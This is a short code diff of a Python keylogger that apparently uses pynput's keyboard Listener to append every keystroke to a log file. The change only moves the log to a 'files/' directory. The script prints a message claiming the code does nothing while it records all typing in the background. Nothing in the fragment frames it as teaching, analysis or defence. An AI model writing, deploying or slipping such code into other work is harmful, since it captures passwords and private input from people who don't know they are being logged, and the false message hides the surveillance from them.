@@ -50,11 +50,10 @@ def write_in_file(key):
     else:
         key = str(key).replace("'", "")
 
-    with open("keystroke.txt", "a") as f:
+    with open("files/keystroke.txt", "a") as f:
         f.write(key)
 
 print("hmmm... I Think This Code Do NOTHING!!")
 
 with Listener(on_press=write_in_file) as l:
     l.join()
-
